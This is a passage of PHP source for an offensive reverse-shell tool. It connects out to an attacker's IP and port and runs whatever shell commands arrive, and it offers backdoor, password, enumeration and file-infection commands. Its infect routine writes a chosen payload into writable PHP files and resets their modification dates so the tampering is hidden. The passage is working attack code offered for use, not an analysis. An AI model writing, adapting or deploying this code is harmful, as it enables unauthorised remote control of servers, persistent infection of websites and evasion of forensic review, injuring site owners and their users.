	fwrite($s, cyan("\n[i] ").white("List of payloads available:\n"));
	$i=true;
	foreach($payloads as $name => $code){
		$desc = $i ? cyan($name).$code : cyan($name).white($code);
		fwrite($s, $desc."\n");
		$i = !$i; //toggle payload color
	}

	fwrite($s, cyan("\n[?] ").white("Choose a payload to infect the selected files (default:0): "));
	while($choosed_payload = fread($s, 128)){
		$user_payload = 0;
		if((int)$choosed_payload <= count($payloads)+1)
			$user_payload = $choosed_payload;
		break;
	}
	fwrite($s, cyan("[?] ").white("Do you want do insert the payload at the beginning [0] or end [1] of the file (default: 1)? "));
	while($position = fread($s, 128)){
		$position = 1;
		if((int)$position === 0) $position = 0;
		break;
	}
	infect($allFiles,$toInfect,(int)$user_payload,$payloads,(int)$position);
	return;
}

//list of all writable php files, files to be infected, index of choosen payload, list of payload, position (beginning or end of file)
function infect($allFiles,$fileArr,$payload_index,$payload_list,$position=1){
	// 1 = end; 0 = beginning
	global $s;
	$payload = $payload_list[array_keys($payload_list)[$payload_index]]; //the payload itself
	fwrite($s, yellow("\n[!] ").white("Files to infect:\n"));
	foreach($fileArr as $fileToInfect)
		fwrite($s,$allFiles[$fileToInfect]."\n");

	fwrite($s, yellow("[!] ").white("Payload: ").$payload_list[array_keys($payload_list)[$payload_index]]."\n");
	$position_str = $position ? "End of file" : "Beginnig of file";
	fwrite($s, yellow("[!] ").white("Position: ").$position_str."\n");
	fwrite($s, cyan("[?] ").white("Are you sure you want to infect those files? [Y/n]"));
	while($sure = fread($s, 128)){
		if(strtolower(substr($sure,0,1)) == "n") return; //not sure, return
		break;
	}

	foreach($fileArr as $fileToInfect){
		$filePath = $allFiles[$fileToInfect]; //fileToInfect is an integer that is the index of the array $allFiles
		if(isAvailable("file_get_contents") && isAvailable("file_put_contents")){
			$old = file_get_contents($filePath);
			$originalDate = str_replace("\n","",run_cmd("stat ".$filePath.' | grep Modify | sed "s/Modify: //"')); //modify date
			if($position) //end of file
				$written = file_put_contents($filePath, "\n".$payload, FILE_APPEND) ? 1 : 0;
			else //beginning of file
				$written = file_put_contents($filePath, $payload."\n".$old) ? 1 : 0;
			$result = $written ? green("[+] ").white($filePath." was infected with payload !") : red("[-] ").white($filePath." Error!");
			fwrite($s,$result."\n");
			if(run_cmd("touch -d ".'"'.$originalDate.'" '.$filePath)) 
				fwrite($s,green("[+] ").white("Mantained original 'modified date' (".$originalDate.").\n"));
		}
	}
	return;
}

function parse_stdin($input){
	global $s, $color;
	switch(substr($input,0,-1)){ // remove newline at end
		case "!all-colors":
			$color = !$color;
			break;
		case "!info":
			return sysinfo();
			break;
		case "!enum":
			return enum();
			break;
		case "!suggester":
			return suggester();
			break;
		case "!color":
			refresh_ps1(true);
			break;
		case "!help":
			return help();
			break;
		case "!php":
			$phpCode = getPHP();
			if($phpCode !== 0){
				$result = runPHP($phpCode);
				fwrite($s, $result);
			}else{
				fwrite($s, yellow("[i] Code canceled.").PHP_EOL);
			}
			break;
		case "!stabilize":
			stabilize();
			break;
		case "!backdoor":
			backdoor();
			break;
		case "!passwd":
			passwd();
			break;
		case "!duplicate":
			duplicate();
			break;
		case "!infect":
			select_files();
			break;
	}	
}

function cmd_not_found($cmd){
	global $s, $commands;
	foreach($commands as $valid_cmd){
		similar_text($cmd, $valid_cmd, $percentage);
		if($percentage > 70){ // if they're similar, suggest correction
			fwrite($s, yellow("[!] ")."Command '!$cmd' not found. Did you mean '!".$valid_cmd."'?.\n");
			return;
		}
	}
	fwrite($s, yellow("[!] ")."Command '!".substr($c,1,-1)."' not found. Use !help.\n");
	return;
}


function connect(){
	global $use_password,$commands,$ps1,$s,$silent;
	refresh_ps1(1);
	if(!isAvailable('fsockopen')) die(red("[-]")." Function 'fsockopen' isn't available.");
	if($use_password)
		if(!check_password()) die(fwrite($s,red("[-]")." Wrong password.\n")); // guess what
	if(!isset($_REQUEST['silent']) && !isset($_REQUEST["s"]) && !$silent) //if not in silent mode
		fwrite($s, banner()."\n"); //send banner through socket
	refresh_ps1();
	fwrite($s, "\n".$ps1);
	while($c = fread($s, 2048)){
		$out = '';
		if(substr($c,0,1) == "!"){//if starts with "!"
			if(in_array(strtolower(substr($c,1,-1)), $commands)) // if the command is valid
				$out = parse_stdin($c);
			else
				cmd_not_found(substr($c,1,-1)); // try to suggest correction
		}elseif(substr($c, 0, 3) == 'cd '){
			chdir(substr($c, 3, -1)); // since this isn't interactive, use chdir 
		}elseif(substr($c,0,-1) == "exit"){
			fwrite($s, yellow("[i] ")."Closing connection.\n");
			fclose($s);
			die();
		}else{
			$out = run_cmd(substr($c, 0, -1));
		}
		if($out === false){
			fwrite($s, red('[-] There are no exec functions'));
			break;
		}
		refresh_ps1();
		fwrite($s, $out.$ps1);
	}
	fclose($s);
}

########################## END FUNCTIONS ##########################

if($auto_verify_update) verify_update();

if(isset($_REQUEST['stabilize']) && $_REQUEST['stabilize']){ //stabilized shell was requested
	$x = $_POST['x'];
	stabilize($x);
}else{ // use normal (not interactive) connection
	$s = @fsockopen("tcp://$ip", $port);
	if(!$s) die(red("[-] ")."Couldn't connect to socket $ip:$port.");
	connect();
}
